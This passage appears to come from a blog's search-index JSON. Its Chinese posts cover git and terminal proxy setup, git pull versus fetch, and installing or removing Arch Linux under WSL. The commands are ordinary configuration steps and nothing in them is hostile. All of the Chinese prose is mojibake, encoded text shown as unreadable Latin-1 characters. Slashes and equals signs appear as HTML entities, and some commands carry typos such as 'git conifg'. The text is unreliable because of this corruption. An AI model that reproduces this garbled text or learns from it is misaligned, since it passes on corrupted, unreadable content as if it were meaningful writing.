proxyå¦‚æœä½ è·Ÿæˆ‘ä¸€æ ·ï¼Œæ›´å–œæ¬¢ä½¿ç”¨åŸç”Ÿçš„gitå‘½ä»¤ï¼Œå–œæ¬¢ä½¿ç”¨åœ¨å‘½ä»¤è¡Œä¸‹æ“ä½œçš„é‚£ç§æ„Ÿè§‰ï¼Œé‚£ä¹ˆä½ ä¹Ÿå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸‹ç›´æ¥é…ç½®ä»£ç†ã€‚ è¿™é‡Œä¹Ÿæœ‰ä¸¤ç§æ–¹å¼ï¼Œæ ¹æ®å®é™…æƒ…å†µè‡ªè¡Œé€‰æ‹©ã€‚ http12$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087 æˆ–è€…ç›´æ¥ç¼–è¾‘~/.gitconifgæ–‡ä»¶ 123456# vim ~&#x2F;.gitconfig[http] proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087[https] proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087 socks512$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086 å…¶ä¸­ï¼Œ1087ã€1086åˆ†åˆ«æ˜¯ä½ æœ¬åœ°æœºå™¨çš„ httpã€socks5ä»£ç†çš„ç«¯å£å·ã€‚ å¦å¤–ï¼Œå¦‚æœæƒ³å–æ¶ˆè®¾ç½®ï¼Œå¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 12$ git config --global --unset http.proxy$ git conifg --global --unset https.proxy é…ç½®å®Œæˆåï¼Œé‡æ–° cloneä¸€éï¼Œå¯ä»¥çœ‹åˆ°é€Ÿåº¦å¾—åˆ°äº†æå¤§çš„æå‡ã€‚ æ³¨æ„âš ï¸ ä¸Šé¢è¿™ç§é…ç½®æ–¹å¼ä»…é€‚ç”¨äº httpsåè®®ï¼Œå¦‚æœä½ åœ¨cloneæ—¶é€‰æ‹©sshåè®®ï¼Œé‚£ä¹ˆé€Ÿåº¦ä»ç„¶ä¼šå¾ˆæ…¢ã€‚ æ›¿æ¢åŸŸåå¦‚æœä½ è§‰å¾—ä¸Šé¢çš„æ–¹å¼å¤ªéº»çƒ¦äº†ï¼Œæˆ–è€…æ˜¯ä½ æ²¡æœ‰ä»£ç†ï¼Œé‚£ä¹ˆå¯ä»¥è¯•è¯•ä¸‹é¢è¿™ç§æ–¹å¼ã€‚ è¿™ç§æ–¹å¼ç®€å•æš´åŠ›ï¼Œæ›¿æ¢å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä½¿ç”¨è§„åˆ™å¦‚ä¸‹ï¼š 12345# åŸåœ°å€$ git clone https:&#x2F;&#x2F;github.com&#x2F;996icu&#x2F;996.ICU.git# æ›¿æ¢æˆ$ git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;996icu&#x2F;996.ICU.git åªéœ€è¦åœ¨github.comåé¢è¿½åŠ ä¸€ä¸ª.cnpmjs.orgå°±å¯ä»¥äº†ã€‚ ä»¥ä¸Šå°±æ˜¯git cloneå¤ªæ…¢æ—¶çš„å„ç§è§£å†³åŠæ³•ã€‚ å‚è€ƒé“¾æ¥Git Clone å¤ªæ…¢æ€ä¹ˆåŠï¼Ÿ","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"}]},{"title":"å¦‚ä½•è®©ç»ˆç«¯å‘½ä»¤èµ°ä»£ç†ï¼Ÿ","slug":"how-to-make-terminal-commands-go-through-proxy","date":"2020-08-18T15:39:58.000Z","updated":"2020-08-18T15:43:24.093Z","comments":true,"path":"how-to-make-terminal-commands-go-through-proxy/","link":"","permalink":"https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/","excerpt":"é—®é¢˜æè¿°ï¼šä»Šå¤©æœ¬æ¥æ‰“ç®—ä½¿ç”¨Homebrew æ›´æ–°ä¸€ä¸ªå·¥å…·ï¼Œä½†æ˜¯è¾“å…¥å®Œbrew updata ä¹‹åï¼Œå°±ä¸€ç›´æ˜¯Updating Homebrew...","text":"é—®é¢˜æè¿°ï¼šä»Šå¤©æœ¬æ¥æ‰“ç®—ä½¿ç”¨Homebrew æ›´æ–°ä¸€ä¸ªå·¥å…·ï¼Œä½†æ˜¯è¾“å…¥å®Œbrew updata ä¹‹åï¼Œå°±ä¸€ç›´æ˜¯Updating Homebrew... è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘äº§ç”Ÿäº†å‡ ä¸ªç–‘é—®ï¼š ä¸ºä»€ä¹ˆå¡ç€ä¸åŠ¨äº†ï¼Œæ˜æ˜æ˜¯æœ‰ç½‘ç»œçš„å•Šã€‚ éš¾é“æ˜¯å› ä¸ºHomebrew éœ€è¦è®¿é—®å›½å¤–çš„æºï¼Ÿ Shadowsocks æ˜æ˜æ˜¯å¼€ç€å…¨å±€ä»£ç†ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰ç”¨ï¼Ÿ å¦‚ä½•è®©ç»ˆç«¯å‘½ä»¤èµ°ä»£ç†ï¼Œæˆ–è€…è¯´å¦‚ä½•è®© Homebrew èµ°ä»£ç†æ›´æ–°ï¼Ÿ æ–¹æ¡ˆé¦–å…ˆå…ˆå›ç­”ä¸€ä¸‹ä¸Šé¢é‚£äº›é—®é¢˜ï¼Œå› ä¸ºå›½å†…ç½‘ç»œç¯å¢ƒè¿›ä¸€æ­¥æ¶åŠ£ï¼Œä½¿å¾—ä»æ ¹æœ¬ä¸Šé€ æˆäº†è¿™ä¸ªé—®é¢˜çš„äº§ç”Ÿã€‚å› ä¸ºShadowshocksçš„å…¨å±€ä»£ç†è™½ç„¶å¯¹æµè§ˆå™¨æ˜¯æœ‰æ•ˆï¼Œä½†å¯¹å‘½ä»¤è¡Œæ— æ•ˆã€‚ æ‰€ä»¥è¿™ä¸€åˆ‡çš„é—®é¢˜å¯ä»¥æ€»ç»“æˆä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœèƒ½è®©ç»ˆç«¯å‘½ä»¤èµ°ä»£ç†å°±å¥½äº†ã€‚ å¥½åœ¨Homebrew æ˜¯æ”¯æŒå…¨å±€ä»£ç†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨å½“å‰ç¯å¢ƒä¸­åŠ å…¥ä»£ç†é…ç½®å°±å¥½äº†ã€‚ 123export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080&#x2F;&#x2F; 1080 æ˜¯æœ¬åœ° socks5 ç›‘å¬ç«¯å£ å¦‚ä½•çŸ¥é“ç»ˆç«¯å‘½ä»¤æœ‰æ²¡æœ‰èµ°ä»£ç†ï¼Ÿ æœ‰ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯é€šè¿‡Curl å‘½ä»¤ï¼š 1curl https:&#x2F;&#x2F;www.google.com å¦‚æœèµ°äº†æœ¬åœ°ä»£ç†ï¼Œé‚£ä¹ˆå¾ˆå¿«ç»ˆç«¯å°±ä¼šæœ‰è¾“å‡ºï¼Œå¦‚æœæ²¡æœ‰èµ°åˆ™ä¼šæç¤º403 ç«¯å£è¯·æ±‚è¶…æ—¶ã€‚ æ°¸ä¹…ç”Ÿæ•ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢çš„é…ç½®ä»…ä»…åªæ˜¯ä¸´æ—¶çš„ï¼Œå¦‚æœé‡å¯ä¸€ä¸‹ç»ˆç«¯ï¼Œè¿™ä¸ªé…ç½®å°±å¤±æ•ˆäº†ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•å¯ä»¥æ°¸ä¹…ç”Ÿæ•ˆå‘¢ï¼Ÿ å½“ç„¶æ˜¯æœ‰çš„ï¼Œåªéœ€è¦å°†ç¯å¢ƒå˜é‡å†™å…¥ç»ˆç«¯ä¸­ã€‚ 12345# bashecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile# zshecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zsh_profile è¿™æ ·ï¼ŒHomebrew å°±èƒ½é€šè¿‡ Shadowsocks æ¥æ›´æ–°äº†ã€‚ å‚è€ƒé“¾æ¥ è®© Homebrew èµ°ä»£ç†æ›´æ–° å¦‚ä½•è®©Homebrew èµ°ä»£ç†æ›´æ–°ï¼Ÿ","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Git Pull å‘½ä»¤è¯¦è§£","slug":"detailed-git-pull-command","date":"2020-08-17T15:34:26.000Z","updated":"2020-08-17T15:36:38.472Z","comments":true,"path":"detailed-git-pull-command/","link":"","permalink":"https://www.0x2beace.com/detailed-git-pull-command/","excerpt":"è¿™ç‰‡æ–‡ç« ä¸»è¦ç”¨æ¥è®²è§£git pullå‘½ä»¤çš„ä¸€äº›ç»†èŠ‚ã€‚","text":"è¿™ç‰‡æ–‡ç« ä¸»è¦ç”¨æ¥è®²è§£git pullå‘½ä»¤çš„ä¸€äº›ç»†èŠ‚ã€‚ git pullgit pull çš„ä½œç”¨æ˜¯ï¼šå–å›è¿œç¨‹ä¸»æœºæŸä¸ªåˆ†æ”¯çš„æ›´æ–°ï¼Œå†ä¸æœ¬åœ°æŒ‡å®šåˆ†æ”¯è‡ªåŠ¨åˆå¹¶ã€‚ æè¿°å°†è¿œç¨‹ä¸»æœºä¸­çš„æ›´æ”¹åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹git pullæ˜¯git fetchå‘½ä»¤å’Œgit merge Fetch_HEADå‘½ä»¤çš„åˆé›†ï¼Œåé¢ä¼šè¯¦ç»†ä»‹ç»ã€‚ ç¤ºä¾‹è¿™æ˜¯git pull çš„å®Œæ•´æ ¼å¼ï¼š 1$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;â€¦]] æ¯”å¦‚è¦å–å›originä¸»æœºçš„fixbugåˆ†æ”¯çš„æœ€æ–°æäº¤ï¼Œå¹¶ä¸æœ¬åœ°çš„masteråˆ†æ”¯åˆå¹¶ï¼Œå°±éœ€è¦å†™æˆè¿™ä¸ªæ ·å­ï¼š 1$ git pull origin fixbug:master å¦‚æœè¿œç¨‹åˆ†æ”¯è¦ä¸å½“å‰åˆ†æ”¯åˆå¹¶ï¼Œåˆ™å†’å·åŠå…¶å†’å·åçš„åˆ†æ”¯å¯ä»¥çœç•¥ï¼Œå°±å˜æˆäº†è¿™ä¸ªæ ·å­ï¼š 12&#x2F;&#x2F; å–å›firebug åˆ†æ”¯çš„æœ€æ–°æäº¤å¹¶ä¸å½“å‰åˆ†æ”¯åˆå¹¶$ git pull origin fixbug ä¸Šé¢çš„å‘½ä»¤è¡¨ç¤ºï¼Œå–å›origin/fixbugåˆ†æ”¯æœ€æ–°çš„æäº¤ï¼Œå¹¶äºå½“å‰åˆ†æ”¯åˆå¹¶ã€‚ è¿™é‡Œå°±ç­‰åŒäºå…ˆgit fetchè·å–æ‰€è·Ÿè¸ªçš„è¿œç¨‹åˆ†æ”¯çš„æœ€æ–°çš„æäº¤ï¼Œç„¶åæ‰§è¡Œgit mergeåˆå¹¶åˆ°å½“å‰åˆ†æ”¯ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢ä¸¤æ¡å‘½ä»¤ã€‚ 12345&#x2F;&#x2F; è‡ªåŠ¨ä»å½“å‰åˆ†æ”¯çš„è·Ÿè¸ªåˆ†æ”¯ä¸Šè·å–æœ€æ–°çš„æäº¤$ git fetch &#x2F;&#x2F; åˆå¹¶origin&#x2F;fixbugåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯$ git merge origin&#x2F;fixbug git fetch ä¸ºä»€ä¹ˆè¿™ä¸ªåˆ†æ”¯æ˜¯è¿™ç§å†™æ³•? å› ä¸ºgit fetchå‘½ä»¤ä¼šè·å–å½“å‰è¿½è¸ªåˆ†æ”¯çš„æœ€æ–°æ›´æ”¹ï¼Œå°±ç­‰åŒäºå–å›origin/fixbugåˆ†æ”¯åˆ°æœ¬åœ°ã€‚ ä½ å¯ä»¥ä½¿ç”¨git branch -a æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ï¼Œä¼šå‘ç°å¤šäº†ä¸€ä¸ª origin/fixbugåˆ†æ”¯ï¼Œå‰ææ˜¯è¯¥åˆ†æ”¯å·²ç»å»ºç«‹äº†è¿½è¸ªå…³ç³»ã€‚ è€Œè¿™ä¸ªåˆ†æ”¯æ‰€åŒ…å«çš„å†…å®¹å°±æ˜¯æœ€æ–°çš„æäº¤æˆ–è€…å…¶ä»–æŸäº›æ›´æ”¹ã€‚æ‰€ä»¥æ­¤æ—¶ä½ éœ€è¦é€šè¿‡åˆå¹¶è¿™ä¸ªé•¿çš„æ¯”è¾ƒå¥‡æ€ªçš„åˆ†æ”¯ï¼Œæ¥æ›´æ–°æœ¬åœ°çš„å·¥ä½œåŒºã€‚ åœ¨æŸäº›åœºåˆï¼ŒGit ä¼šè‡ªåŠ¨åœ¨æœ¬åœ°åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯ä¹‹é—´å»ºç«‹ä¸€ç§è¿½è¸ªå…³ç³»ï¼ˆtrackingï¼‰ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨clone æ—¶ï¼Œä¼šå‘ç°æ‰€æœ‰æœ¬åœ°åˆ†æ”¯é»˜è®¤ä¸è¿œç¨‹ä¸»æœºçš„åŒååˆ†æ”¯ï¼Œå»ºç«‹è¿½è¸ªå…³ç³»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬åœ°çš„ master åˆ†æ”¯è‡ªåŠ¨è¿½è¸ª origin/masteråˆ†æ”¯ã€‚ Git ä¹Ÿå…è®¸æ‰‹åŠ¨æ·»åŠ è¿½è¸ªå…³ç³»ã€‚ 12&#x2F;&#x2F; æœ¬åœ°masteråˆ†æ”¯ä¸å–å›origin&#x2F;fixbugåˆ†æ”¯å»ºç«‹å…³ç³»ã€‚$ git branch --set-upstream master origin&#x2F;fixbug å¦‚æœå½“å‰åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å­˜åœ¨è¿½è¸ªå…³ç³»ã€‚é‚£ä¹ˆgit pull å°±å¯ä»¥çœç•¥è¿œç¨‹åˆ†æ”¯åã€‚ 1$ git pull origin ä¸Šé¢çš„åˆ†æ”¯æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå°±æ˜¯è¡¨ç¤ºæœ¬åœ°çš„å½“å‰åˆ†æ”¯ä¼šè‡ªåŠ¨ä¸å¯¹åº”çš„originä¸»æœºçš„â€œè¿½è¸ªåˆ†æ”¯â€è¿›è¡Œåˆå¹¶ã€‚ å¦‚æœå½“å‰åˆ†æ”¯åªå¯¹åº”ä¸€ç§è¿½è¸ªåˆ†æ”¯ï¼Œé‚£ä¹ˆè¿œç¨‹ä¸»æœºåéƒ½å¯ä»¥çœç•¥ã€‚ 12&#x2F;&#x2F; è¿™ä¹Ÿå°±æˆäº†æˆ‘ä»¬å¸¸çœ‹è§çš„åŸå§‹å‘½ä»¤ã€‚$ git pull ä¸Šé¢çš„å‘½ä»¤ä¼šè‡ªåŠ¨çš„ä¸å”¯ä¸€çš„è¿½è¸ªåˆ†æ”¯è¿›è¡Œåˆå¹¶ã€‚ å¦‚ä½•å°†è¿œç¨‹åˆ†æ”¯ä½œä¸ºæœ¬åœ°çš„é»˜è®¤åˆ†æ”¯ï¼Ÿ 1$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt; è¿™æ ·å°±å°†è¿œç¨‹çš„åˆ†æ”¯ä¸æœ¬åœ°åŒååˆ†æ”¯å»ºç«‹äº†è¿½è¸ªå…³ç³»ã€‚ å¯ä»¥ä½¿ç”¨git config -eå‘½ä»¤æŸ¥çœ‹ã€‚ å½“è¿½è¸ªå…³ç³»åªæœ‰ä¸€ä¸ªæ—¶ï¼Œé‚£ä¹ˆä½¿ç”¨git pull å‘½ä»¤ï¼Œå°±å¯ä»¥ç›´æ¥æ›´æ–°&lt;remote branch&gt; åˆ†æ”¯äº†ã€‚ å¦‚æœåˆå¹¶éœ€è¦é‡‡ç”¨rebaseæ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨--rebaseé€‰é¡¹ã€‚ git rebase è¿™é‡Œè¯´ä¸€ä¸ªé¢˜å¤–è¯ï¼Œrebase æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆç”¨ï¼Ÿ git rebase æ¸…é™¤æœ¬åœ°å†å²æäº¤ 1$ git --rebase &lt;è¿œç¨‹ä¸»æœºå&gt;&lt;è¿œç¨‹åˆ†æ”¯å&gt;:&lt;æœ¬åœ°åˆ†æ”¯å&gt; git fetch ä¸ git pull çš„åŒºåˆ«ã€‚ git fetch è¡¨ç¤ºä»è¿œç¨‹è·å–æœ€æ–°çš„ç‰ˆæœ¬åˆ°æœ¬åœ°ï¼Œä½†æ˜¯ä¸ä¼šè‡ªåŠ¨åˆå¹¶ã€‚å…¶è¿‡ç¨‹ç”¨å‘½ä»¤è¡¨ç¤ºå°±æ˜¯ï¼š 123$ git fetch origin master$ git log -p master..origin&#x2F;master$ git merge origin&#x2F;master å¦ä¸€ç§å†™æ³•å°±æ˜¯ï¼š 123$ git fetch origin master:tem$ git diff tem$ git merge tem ä¸Šé¢è¿™ä¸¤ç§å†™æ³•éƒ½æ˜¯éƒ½æ˜¯ä¸€ä¸ªæ„æ€ã€‚å”¯ä¸€æœ‰æ‰€åŒºåˆ«çš„å°±æ˜¯ä½¿ç”¨ temåˆ†æ”¯ä»£æ›¿äº†origin/masteråˆ†æ”¯çš„å­˜åœ¨ã€‚å…¶å«ä¹‰æ˜¯ï¼š ä»è¿œç¨‹originä¸»æœºçš„masterä¸»åˆ†æ”¯ä¸‹è½½æœ€æ–°çš„ç‰ˆæœ¬åˆ°æœ¬åœ°origin/masteråˆ†æ”¯ï¼Œæˆ–è€…temåˆ†æ”¯ã€‚ æ¯”è¾ƒæœ¬åœ°masteråˆ†æ”¯ä¸origin/masterï¼ˆtemï¼‰åˆ†æ”¯çš„å·®å¼‚ã€‚ æœ€åè¿›è¡Œåˆå¹¶ git pullï¼Œç›¸å½“äºä»è¿œç¨‹è·å–æœ€æ–°çš„ç‰ˆæœ¬å¹¶åˆå¹¶åˆ°æœ¬åœ°ã€‚ 1$ git pull origin master ä¸Šè¿°å‘½ä»¤å…¶å®ç›¸å½“äºgit fetch å’Œ git mergeåœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œgit fetchæ›´å®‰å…¨ä¸€äº›ï¼Œå› ä¸ºåœ¨mergeå‰ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æ›´æ–°æƒ…å†µï¼Œç„¶åå†å†³å®šæ˜¯å¦åˆå¹¶ã€‚","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Win10 å¦‚ä½•å¸è½½ Arch Linux","slug":"how-to-uninstall-wsl-linux-subsystem-in-win-10","date":"2020-08-16T09:56:22.000Z","updated":"2020-08-23T02:46:19.997Z","comments":true,"path":"how-to-uninstall-wsl-linux-subsystem-in-win-10/","link":"","permalink":"https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/","excerpt":"æœ€è¿‘åœ¨Windows ä¸Šå®‰è£… WSLï¼Œé‡åˆ°ä¸€ç‚¹é—®é¢˜ï¼Œéœ€è¦å°† Arch Linux å®Œå…¨å¸è½½ã€‚","text":"æœ€è¿‘åœ¨Windows ä¸Šå®‰è£… WSLï¼Œé‡åˆ°ä¸€ç‚¹é—®é¢˜ï¼Œéœ€è¦å°† Arch Linux å®Œå…¨å¸è½½ã€‚ åœ¨æ­£å¼å¸è½½ä¹‹å‰ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š ä¸è¦è¯•å›¾é€šè¿‡ Microsoft Store å»å¸è½½ï¼Œé‚£é‡Œåªæœ‰å®‰è£…æŒ‰é’®ï¼Œæ²¡æœ‰å¸è½½æŒ‰é’®ã€‚ ç§‹å­£åˆ›æ„è€…æ›´æ–°ä¹‹å‰ï¼Œå¯ä»¥ä½¿ç”¨lxrunå‘½ä»¤å»è¿›è¡Œå¸è½½æ“ä½œï¼Œä½†æ˜¯ç§‹å­£åˆ›æ„è€…æ›´æ–°ä¹‹åè¯¥å‘½ä»¤å°±è¢«ç§»é™¤äº†ã€‚ æŸ¥çœ‹å‘è¡Œç‰ˆåˆ—å‡ºå½“å‰å·²ç»å®‰è£…ä¸”éšæ—¶å¯ç”¨çš„å‘è¡Œç‰ˆï¼š 1wslconfig &#x2F;list åˆ—å‡ºæ‰€æœ‰å‘è¡Œç‰ˆï¼ŒåŒ…æ‹¬æ­£åœ¨å®‰è£…ã€å¸è½½å’Œå·²æŸåçš„å‘è¡Œç‰ˆï¼š 1wslconfig &#x2F;list &#x2F;all å¸è½½å¸è½½å·²ç»å®‰è£…çš„å‘è¡Œç‰ˆï¼š 12345$ wslconfig &#x2F;list &#x2F;allWindows Subsystem for Linux Distributions:Arch (Default)$ wslconfig &#x2F;unregister ArchUnregistering... ä¸Šé¢æ˜¯ä»¥Arch Linuxä¸ºä¾‹è¿›è¡Œå¸è½½ï¼Œå…¶ä»–å‘è¡Œç‰ˆåŒç†ï¼Œåªéœ€è¦æ›¿æ¢å‘è¡Œç‰ˆçš„åç§°å°±å¯ä»¥äº†ã€‚ æ³¨æ„: å¸è½½å‘è¡Œç‰ˆæ—¶ï¼Œä¼šæ°¸ä¹…åˆ é™¤æ‰€æœ‰ä¸è¯¥å‘è¡Œç‰ˆæœ‰å…³çš„æ•°æ®å’Œè®¾ç½®ã€‚ å‚è€ƒé“¾æ¥ Windows 10 Linuxå­ç³»ç»Ÿå¦‚ä½•å¸è½½ï¼Ÿ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"Win10 å¦‚ä½•å®‰è£… Arch Linux","slug":"how-to-install-arch-linux-on-win10","date":"2020-08-16T09:50:09.000Z","updated":"2020-08-16T10:00:10.873Z","comments":true,"path":"how-to-install-arch-linux-on-win10/","link":"","permalink":"https://www.0x2beace.com/how-to-install-arch-linux-on-win10/","excerpt":"æœ€è¿‘ä¸»åŠ›ç”Ÿäº§å·¥å…·å¯èƒ½è¦æ‹¿å»é€ä¿®ï¼Œæ‰€ä»¥å¯èƒ½æœ‰ä¸€æ®µæ—¶é—´è¦å’Œæˆ‘çš„MBP åˆ†å¼€äº†ã€‚ä½†æ˜¯å·¥ä½œè¿˜æ˜¯è¦ç»§ç»­ï¼Œäºæ˜¯æŠŠä¹‹å‰é—²ç½®çš„ å°ç±³ Pro 15.6 ç»™æ•´èµ·æ¥ã€‚ ç¬¬ä¸€ä»¶éœ€è¦åšçš„äº‹æƒ…å°±æ˜¯é…ç½®å¼€å‘ç¯å¢ƒã€‚","text":"æœ€è¿‘ä¸»åŠ›ç”Ÿäº§å·¥å…·å¯èƒ½è¦æ‹¿å»é€ä¿®ï¼Œæ‰€ä»¥å¯èƒ½æœ‰ä¸€æ®µæ—¶é—´è¦å’Œæˆ‘çš„MBP åˆ†å¼€äº†ã€‚ä½†æ˜¯å·¥ä½œè¿˜æ˜¯è¦ç»§ç»­ï¼Œäºæ˜¯æŠŠä¹‹å‰é—²ç½®çš„ å°ç±³ Pro 15.6 ç»™æ•´èµ·æ¥ã€‚ ç¬¬ä¸€ä»¶éœ€è¦åšçš„äº‹æƒ…å°±æ˜¯é…ç½®å¼€å‘ç¯å¢ƒã€‚ äº†è§£ WSLä»€ä¹ˆæ˜¯ WSL ï¼ŸWindows Linux Server (WSL) åˆåWindows å­ç³»ç»Ÿï¼Œå®ƒä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥ç›´æ¥åœ¨æœªç»ä¿®æ”¹å¾—Windows ä¸Šè¿è¡Œ Gun/Linux ç¯å¢ƒï¼Œä¹ŸåŒ…æ‹¬å¤§å¤šæ•°å‘½ä»¤è¡Œå·¥å…·ï¼Œå®ç”¨ç¨‹åºå‘˜å’Œåº”ç”¨ç¨‹åºå‘˜ï¼Œè€Œä¸ä¼šéœ€è¦é¢å¤–å¢åŠ è™šæ‹Ÿæœºã€‚ WSL å¯ä»¥åšä»€ä¹ˆ ä½ å¯ä»¥è‡ªè¡Œé€‰æ‹©ä½ å–œæ¬¢çš„ Gun/Linux å‘è¡Œç‰ˆï¼šArch Linuxã€Ubuntuã€OpenSuSEã€Kail Linuxã€Debianã€Fedoraç­‰ã€‚ è¿è¡Œé€šç”¨çš„å‘½ä»¤è¡Œï¼Œä¾‹å¦‚grepï¼Œsedï¼Œawkæˆ–å…¶ä»–ELF-64äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ è½»æ¾è¿è¡ŒBash Shellè„šæœ¬å’Œ GNU/Linux å‘½ä»¤è¡Œåº”ç”¨ç¨‹åº ä½¿ç”¨è‡ªå·±çš„ GNU/Linux åˆ†å‘ç¨‹åºåŒ…ç®¡ç†å™¨å®‰è£…å…¶ä»–è½¯ä»¶ã€‚ ä½¿ç”¨ç±»ä¼¼Unixçš„å‘½ä»¤è¡Œå¤–å£³è°ƒç”¨Windowsåº”ç”¨ç¨‹åºã€‚ åœ¨Windowsä¸Šè°ƒç”¨ GNU/Linux åº”ç”¨ç¨‹åºã€‚ æœ‰äº†è¿™äº›åŠŸèƒ½ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®Œæˆå¾ˆå¤šå·¥ä½œï¼Œè€Œä¸å¿…æ‹…å¿ƒå®‰è£…è™šæ‹Ÿæœºç›‘æ§ç¨‹åºï¼Œä»è€Œäº«å—Linuxçš„å¥½å¤„ã€‚å®‰è£…å¹¶å‡†å¤‡å¥½Win 10åï¼Œè¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼Œå¹¶åœ¨å…¶ä¸­æ·»åŠ Arch Linuxã€‚ å®‰è£… WSLæœ¬æ–‡è¦å®‰è£…çš„WSL æ˜¯ Arch Linux ã€‚ ä¸ºä»€ä¹ˆè¦é€‰æ‹© Arch Linuxï¼Ÿ å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªè½»é‡çº§ä¸”çµæ´»çš„Linux å‘è¡Œç‰ˆã€‚ ä¸ºLinux å®‰è£…Windows å­ç³»ç»Ÿè¿™æ˜¯ä¸€é¡¹ä½¿Windowsèƒ½å¤Ÿâ€œ æ‰˜ç®¡ â€ Linux çš„åŠŸèƒ½ã€‚æ‰€ä»¥éœ€è¦å…ˆå¯ç”¨æ­¤åŠŸèƒ½ã€‚ ä»¥ç®¡ç†å‘˜çš„èº«ä»½æ‰“å¼€Power Shellï¼Œç„¶åè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux é€šå¸¸ä¼šé‡å¯ä¸€æ¬¡ä½ çš„ç”µè„‘ã€‚ å®‰è£…Arch Linuxæˆ‘è®°å¾—åœ¨2019 å¹´ï¼ŒWindows åˆšæ‹¥æŠ± Linux æ—¶ï¼ŒArch Linux è¿˜å¯ä»¥ç›´æ¥ä» Microsoft Store ç›´æ¥ä¸‹è½½ï¼Œä¸çŸ¥ä¸ºä½•ç°åœ¨å´æœä¸åˆ°äº†ã€‚ ä¸è¿‡è¿˜æ˜¯æœ‰å…¶ä»–åŠæ³•æ‰‹åŠ¨å®‰è£…ï¼Œæ‰“å¼€è¯¥é¡µé¢ï¼Œä¸‹è½½Arch.zipã€‚ è§£å‹å®Œæˆä¹‹åï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹æ–‡ä»¶ï¼š åŒå‡»Arch.exeåº”ç”¨ç¨‹åºï¼Œè¿›è¡Œå®‰è£…ã€‚ ç¨å¾®ç­‰å¾…ä¸€ä¼šï¼Œå°±å¯ä»¥çœ‹åˆ°Arch Linux å·²ç»é¡ºåˆ©å®‰è£…å®Œæˆäº†ï¼Œç„¶åæŒ‰ä»»æ„é”®é€€å‡ºã€‚ å¯åŠ¨Arch Linuxå†æ¬¡åŒå‡»Arch Linuxï¼Œä¸å‡ºæ„å¤–çš„è¯ï¼Œå°±å¯ä»¥çœ‹åˆ°Arch Linux çš„æ§åˆ¶å°äº†ï¼Œæ²¡é”™å°±æ˜¯è¿™ä¹ˆç®€å•ã€‚ 